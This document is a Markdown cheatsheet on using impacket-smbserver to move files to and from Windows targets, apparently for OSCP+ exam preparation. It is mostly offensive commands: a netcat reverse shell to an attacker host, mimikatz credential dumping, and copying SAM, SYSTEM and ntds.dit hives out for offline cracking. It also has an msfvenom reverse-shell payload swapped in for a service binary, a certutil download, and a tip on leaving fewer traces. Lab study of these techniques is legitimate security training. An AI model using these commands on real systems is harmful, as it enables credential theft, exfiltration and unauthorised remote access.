# Impacket-Smbserver - File Transfer Cheatsheet (OSCP+)

impacket-smbserver creates a quick SMB share on your Kali machine. You use it to transfer files to and from Windows targets. This is one of the fastest and most reliable file transfer methods for OSCP+.

---

### Start SMB Server on Kali

#### Basic (No Authentication)

```bash
# Share current directory as "share"
impacket-smbserver share .

# Share a specific folder
impacket-smbserver share /home/kali/tools/

# Share with a custom name
impacket-smbserver tools /home/kali/tools/
```

#### With SMBv2 Support (Use This - Modern Windows Needs It)

```bash
# Most Windows 10/11 and Server 2016+ require SMBv2
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support --debug

# Share tools folder with SMBv2
impacket-smbserver share /home/kali/tools/ -smb2support
```

#### With Username and Password (If Target Blocks Anonymous)

```bash
# Some targets block unauthenticated SMB connections
impacket-smbserver share . -smb2support -username kali -password kali
```

On the target, connect with:

```cmd
net use \\KALI_IP\share /user:kali kali
```

---

### Transfer Files FROM Kali TO Target

#### CMD

```cmd
# Copy single file
copy \\KALI_IP\share\nc.exe C:\Users\Public\nc.exe
copy \\KALI_IP\share\winPEASany.exe C:\temp\winPEASany.exe
copy \\KALI_IP\share\mimikatz.exe C:\Users\Public\mimikatz.exe

# Copy multiple files
copy \\KALI_IP\share\*.exe C:\temp\
```

#### PowerShell

```powershell
# Copy file
Copy-Item \\KALI_IP\share\nc.exe C:\Users\Public\nc.exe

# Copy and run directly (no file on disk)
\\KALI_IP\share\SharpUp.exe audit
```

#### Run Directly from Share (No Copy Needed)

```cmd
# Run exe directly from your SMB share
\\KALI_IP\share\nc.exe KALI_IP 4444 -e cmd.exe
\\KALI_IP\share\SharpHound.exe --CollectionMethods All
\\KALI_IP\share\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
\\KALI_IP\share\PrintSpoofer64.exe -i -c cmd
```

This is very useful — no need to upload anything to disk. Just run it straight from the share.

---

### Transfer Files FROM Target TO Kali (Exfiltration)

#### CMD

```cmd
# Copy files from target to your Kali share
copy C:\Users\Administrator\Desktop\proof.txt \\KALI_IP\share\proof.txt
copy C:\temp\SAM \\KALI_IP\share\SAM
copy C:\temp\SYSTEM \\KALI_IP\share\SYSTEM
copy C:\temp\ntds.dit \\KALI_IP\share\ntds.dit
```

#### PowerShell

```powershell
Copy-Item C:\Users\Administrator\Desktop\proof.txt \\KALI_IP\share\proof.txt
```

Files will appear in the folder you shared on Kali.

---

### Map as Network Drive

```cmd
# Map the share as a drive letter
net use Z: \\KALI_IP\share

# With credentials
net use Z: \\KALI_IP\share /user:kali kali

# Now use it like a normal drive
copy Z:\nc.exe C:\Users\Public\nc.exe
Z:\SharpUp.exe audit

# Disconnect when done
net use Z: /delete
```

---

### Common OSCP+ Scenarios

#### Upload Tools for Enumeration

```bash
# On Kali - start server in your tools folder
impacket-smbserver share /home/kali/tools/ -smb2support
```

```cmd
# On Target - grab what you need
copy \\KALI_IP\share\winPEASany.exe C:\Users\Public\
copy \\KALI_IP\share\PowerUp.ps1 C:\Users\Public\
copy \\KALI_IP\share\SharpHound.exe C:\Users\Public\
```

#### Exfiltrate SAM and SYSTEM for Offline Cracking

```cmd
# On Target - save registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Send to Kali
copy C:\temp\SAM \\KALI_IP\share\SAM
copy C:\temp\SYSTEM \\KALI_IP\share\SYSTEM
```

```bash
# On Kali - crack offline
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#### Reverse Shell via SMB

```bash
# On Kali - put nc.exe in share folder and start server
cp /usr/share/windows-resources/binaries/nc.exe /home/kali/tools/
impacket-smbserver share /home/kali/tools/ -smb2support

# Start listener
nc -nvlp 4444
```

```cmd
# On Target - run nc directly from share
\\KALI_IP\share\nc.exe KALI_IP 4444 -e cmd.exe
```

#### PrivEsc - Replace Service Binary

```bash
# On Kali - generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o evil.exe
impacket-smbserver share . -smb2support
```

```cmd
# On Target - copy payload and replace vulnerable service binary
copy \\KALI_IP\share\evil.exe "C:\Program Files\Vulnerable Service\service.exe"
sc stop vulnservice
sc start vulnservice
```

---

### Troubleshooting

#### "Access Denied" or Connection Refused

```bash
# Add authentication
impacket-smbserver share . -smb2support -username kali -password kali
```

```cmd
# On target connect with creds
net use \\KALI_IP\share /user:kali kali
```

#### "SMB1 Not Supported" Error

```bash
# Always use -smb2support flag
impacket-smbserver share . -smb2support
```

#### Target Firewall Blocking SMB (Port 445)

If SMB is blocked, use alternative transfer methods:

```bash
# Python HTTP server instead
python3 -m http.server 80
```

```cmd
# On target use certutil
certutil -urlcache -f http://KALI_IP/nc.exe C:\Users\Public\nc.exe
```

---

## Pro Tips

- Always use `-smb2support` — modern Windows blocks SMBv1
- Running exes directly from share (`\\IP\share\tool.exe`) avoids writing to disk — less traces
- If anonymous access fails, add `-username` and `-password` flags
- Keep a dedicated `/home/kali/tools/` folder with all your OSCP tools ready to share
- SMB transfer is faster than HTTP for large files like ntds.dit
- You can see connection logs in the smbserver terminal — useful to confirm target is connecting
- For the exam, have smbserver running in a tmux pane the entire time